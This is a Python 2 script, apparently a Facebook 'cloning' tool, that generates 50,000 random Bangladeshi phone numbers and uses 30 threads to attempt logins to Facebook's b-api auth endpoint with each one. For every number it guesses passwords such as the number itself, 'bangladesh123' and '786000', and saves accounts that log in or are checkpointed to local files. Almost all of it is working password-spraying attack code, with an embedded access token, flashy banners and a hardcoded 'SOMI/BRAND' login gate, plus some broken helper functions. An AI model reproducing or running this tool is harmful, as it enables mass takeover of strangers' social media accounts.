# Ustad# SIDRA5# Thuglife# Somibro# Gamz#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(50000):

    nmbr = random.randint(11111111, 99999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 Trend')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)

back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;91m----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----*----
\033[1;92m-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-**-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-


\033[1;93m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;96m██╔════╝██╔══██╗████╗░████║██║
\033[1;97m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;97m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;96m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;93m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

\033[1;91m♪♪♪♪♪♪♪┈┈╱▔▏┈┈╱▔╲┈┈╱▔╲    
\033[1;92m♪♪♪♪♪♪♪┈╱╱▏▏┈▕╱▔▏▏▕▕▔▏▏
\033[1;93m♪♪♪♪♪♪♪┈▏▔┈▏┈┈┈╱╱┈▕▕┈▏▏
\033[1;94m♪♪♪♪♪♪♪┈▔▔▏▏╭╮╱┈▔▏┈╲▔╱┈
\033[1;96m♪♪♪♪♪♪♪┈┈┈▔┈╰╯▔▔▔┈┈┈▔┈┈

\033[1;93m----*----*----*----*----*----*----*----*----*----*----*----*-
\033[1;94m----*----*----*----*----*----*----*----*----*----*----*----*-

"""

####Logo####

logo1 = """
   　 　 　 🌿
　 　 　 　 🌿
🌿　 　 　 🌿　 　 　 🌿
　 🌿　 　 🌿　 　 🌿
　 　 🌿　 🌿　 🌿
　 　 　 🌿🌿🌿
🌿🌿🌿🌿🌿🌿🌿🌿🌿
　 　 　 　 🌿
　 　 　 　 🌿

\033[1;93m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;91m██╔════╝██╔══██╗████╗░████║██║
\033[1;94m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;94m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;91m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;93m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝

●●━━━━━━━━●●━━━━━━━━●●━━━━━━━━●●━━━━━━━━●●


"""
logo2 = """


\033[1;91m░██████╗░█████╗░███╗░░░███╗██╗
\033[1;92m██╔════╝██╔══██╗████╗░████║██║
\033[1;93m╚█████╗░██║░░██║██╔████╔██║██║
\033[1;94m░╚═══██╗██║░░██║██║╚██╔╝██║██║
\033[1;95m██████╔╝╚█████╔╝██║░╚═╝░██║██║
\033[1;96m╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═╝
●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●━●
\033[1;91m██████╗░██████╗░░█████╗░███╗░░██╗██████╗░
\033[1;92m██╔══██╗██╔══██╗██╔══██╗████╗░██║██╔══██╗
\033[1;93m██████╦╝██████╔╝███████║██╔██╗██║██║░░██║
\033[1;94m██╔══██╗██╔══██╗██╔══██║██║╚████║██║░░██║
\033[1;95m██████╦╝██║░░██║██║░░██║██║░╚███║██████╔╝
\033[1;96m╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░
◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○◆○

"""
CorrectUsername = "SOMI"
CorrectPassword = "BRAND"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;93m\x1b[1;93mBRAND NAME\x1b[1;93m✈✈\x1b[1;95m")
    if (username == CorrectUsername):
	  password = raw_input("\033[1;94m \x1b[1;95mBRAND PASSWORD\x1b[1;93m✈✈\x1b[1;93m")
        if (password == CorrectPassword):
            print "Logged in successfully as✈✈✈ " + username #Dev:SOMI
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;94mWrong Password"
            os.system('xdg-open https://m.facebook.comSOMIMISICAN.com')
    else:
        print "\033[1;94mWrong Username"
        os.system('xdg-open https://m.facebook.comSOMIMUSICAN.com')
        
##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;91m*-*-*-*-*NO LOGIN NEED-*-*-*-**"
    time.sleep(0.05)
    print "\033[1;92m●━━━━━━━━●●━━━━━━━━●●━━━━━━━━●"
    time.sleep(0.05)
    print "\033[1;97m[1>>>]\x1b[1;93mCLONING WITHOUT LOGIN( \033[1;92m NOW)"  
    time.sleep(0.05)
    print '\x1b[1;94m[0>>>]\033[1;91m Exit ( Back)'
    print'\033[1;92m●━━━━━━━━●●━━━━━━━━●●━━━━━━━━●'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;94mCHOOSE: \033[1;93m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="1":
        Zeek()
def Zeek():
    os.system('clear')
    print logo2
    print'\033[1;92m●━━━━━━●SELECT°●━━━━━━●'
    time.sleep(0.10)
    print'\033[1;93m●━━━━━━━━●●━━━━━━━━●'
    print '\x1b[1;97m[1>>>] BANGLADESH'
    time.sleep(0.10)
    print '\x1b[1;94m[0] back'
    print'\033[1;92m●━━━━━━━━●●━━━━━━━━●'
    time.sleep(0.10)
    print'\033[1;93m●━━━━━━● SOMI ●━━━━━━━●'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;93mCHOOSE:\033[1;93m')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="1":              
        os.system("clear")
        print logo2
        
        print'\033[1;92m █▀▄ ▄▀▄ █▄░█ ▄▀▀░ █░░ ▄▀▄ █▀▄ █▀▀ ▄▀▀ █░░'
        print'\033[1;93m █▀█ █▀█ █░▀█ █░▀▌ █░▄ █▀█ █░█ █▀▀ ░▀▄ █▀▄'
        print'\033[1;94m ▀▀░ ▀░▀ ▀░░▀ ▀▀▀░ ▀▀▀ ▀░▀ ▀▀░ ▀▀▀ ▀▀░ ▀░▀'
        print'\033[1;92m MA ADMI KOI AMM NI ONE MAN ARMY'
        print "\033[1;93mEnter any Bangladesh Mobile code Number"+'\n'
        print 'Enter any code 175,165,191, 192, 193, 194, 195, 196, 197, 198, 199 '
        try:
            c = raw_input("\033[1;97mCHOOSE : ")
            k="+880"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 47* '\033[1;97m◎'
    xxx = str(len(id))
    jalan ('[✔]\033[1;96m Total Bangladesh ids: '+xxx)
    jalan ('[🔐] \033[1;91mPassword     '+xxx)
    jalan ('[✔]\033[1;92mCode you choose: '+c)
    jalan ("[🚀]\033[1;93mWait A While Start Cracking...")
    jalan ("[♻]\033[1;94mTo Stop Process Press Ctrl+z")
    jalan ("[⚠]\033[1;97m All password avalible")
    print 47* '\033[1;97m◎'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass1                                       
                okb = open('save/successfull.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass1
                    cps = open('save/checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;93m(Open Now)  ' + k + c + user +  ' ● ' + pass2
                        okb = open('save/successfull.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass2
                            cps = open('save/checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="bangladesh123"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● '+ pass3
                                okb = open('save/successfull.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass3 
                                    cps = open('save/checkpoint.txt', 'a')
                                    cps.write(k+c+user+pass3+'\n')
                                    cps.close()
                                    cpb.append(c+user+pass3)
                                else:
                                    pass4="786000"
                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass4 
                                        okb = open('save/successfull.txt', 'a')
                                        okb.write(k+c+user+pass4+'\n')
                                        okb.close()
                                        oks.append(c+user+pass4)
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass4
                                            cps = open('save/checkpoint.txt', 'a')
                                            cps.write(k+c+user+pass4+'\n')
                                            cps.close()
                                            cpb.append(c+user+pass4)
                                        else:
                                            pass5="bangla123"
                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass5
                                                okb = open('save/successfull.txt', 'a')
                                                okb.write(k+c+user+pass5+'\n')
                                                okb.close()
                                                oks.append(c+user+pass5)
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass5 
                                                    cps = open('save/checkpoint.txt', 'a')
                                                    cps.write(k+c+user+pass5+'\n')
                                                    cps.close()
                                                    cpb.append(c+user+pass5)
                                                else:                                                                                                                                                                 
                                                    pass6="bangladesh786"
                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass6
                                                        okb = open('save/successfull.txt', 'a')
                                                        okb.write(k+c+user+pass6+'\n')
                                                        okb.close()
                                                        oks.append(c+user+pass6)                                                                                                                                                            
                                                    else:                                                                                                                                                  
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass6
                                                            cps = open('save/checkpoint.txt', 'a')
                                                            cps.write(k+c+user+pass6+'\n')
                                                            cps.close()
                                                            cpb.append(c+user+pass6)                                                                                                                               
                                                        else:                                                                                                                                                              
                                                            pass7="bangladesh12345"
                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass7
                                                                okb = open('save/successfull.txt', 'a')
                                                                okb.write(k+c+user+pass7+'\n')
                                                                okb.close()
                                                                oks.append(c+user+pass7)                                                                                                                                                            
                                                            else:                                                                                                                                                  
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass7
                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                    cps.write(k+c+user+pass7+'\n')
                                                                    cps.close()
                                                                    cpb.append(c+user+pass7)                                                                                                                               
                                                                else:                                                                                                                                                              
                                                                    pass8="bangladesh123456"
                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                    q = json.load(data)
                                                                    if 'access_token' in q:
                                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass8
                                                                        okb = open('save/successfull.txt', 'a')
                                                                        okb.write(k+c+user+pass8+'\n')
                                                                        okb.close()
                                                                        oks.append(c+user+pass8)                                                                                                                                                            
                                                                    else:                                                                                                                                                  
                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass8
                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                            cps.write(k+c+user+pass8+'\n')
                                                                            cps.close()
                                                                            cpb.append(c+user+pass8)                                                                                                                               
                                                                        else:                                                                                                                                                              
                                                                            pass9="786786"
                                                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                            q = json.load(data)
                                                                            if 'access_token' in q:
                                                                                print '\x1b[1;93m(Aftar 7days)  ' + k + c + user + ' ● ' + pass9
                                                                                okb = open('save/successfull.txt', 'a')
                                                                                okb.write(k+c+user+pass9+'\n')
                                                                                okb.close()
                                                                                oks.append(c+user+pass9)                                                                                                                                                            
                                                                            else:                                                                                                                                                  
                                                                                if 'www.facebook.com' in q['error_msg']:
                                                                                    print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass9
                                                                                    cps = open('save/checkpoint.txt', 'a')
                                                                                    cps.write(k+c+user+pass9+'\n')
                                                                                    cps.close()
                                                                                    cpb.append(c+user+pass9)                                                                                                                               
                                                                                else:                                                                                                                                                              
                                                                                    pass10="000786"
                                                                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                                                                                    q = json.load(data)
                                                                                    if 'access_token' in q:
                                                                                        print '\x1b[1;93m(Open Now)  ' + k + c + user + ' ● ' + pass10
                                                                                        okb = open('save/successfull.txt', 'a')
                                                                                        okb.write(k+c+user+pass10+'\n')
                                                                                        okb.close()
                                                                                        oks.append(c+user+pass10)                                                                                                                                                            
                                                                                    else:                                                                                                                                                  
                                                                                        if 'www.facebook.com' in q['error_msg']:
                                                                                            print '\033[1;92m(Aftar 7days) ' + k + c + user + ' ● ' + pass10
                                                                                            cps = open('save/checkpoint.txt', 'a')
                                                                                            cps.write(k+c+user+pass10+'\n')
                                                                                            cps.close()
                                                                                            cpb.append(c+user+pass10)                                                                                                                               
                                                                                                                                                   
                                                                                                                                                                                                            
                                                                                                                                                                                                            


                                                                                                                                                                                                            
                                                                                                                                                                                                                    
                                                                                                                                                                                                            



        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/cloned.txt')
    jalan("Note : Your Offline account Will Open after 10 to 20 days")
    print ''
    print """
   
───────────────────────▄██▄▄██▄
──────────────────────██████████
──────────────────────▀████████▀
────────────────────────▀████▀
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
─────────────────────────████
──────────────────────▄▄▄████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▀▀▀████
──────────────────────▄█████▀



\033[1;96mThanks me later
\033[1;95mFb\033[1;95mSOmi
\033[1;95mBRAND BOY g"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

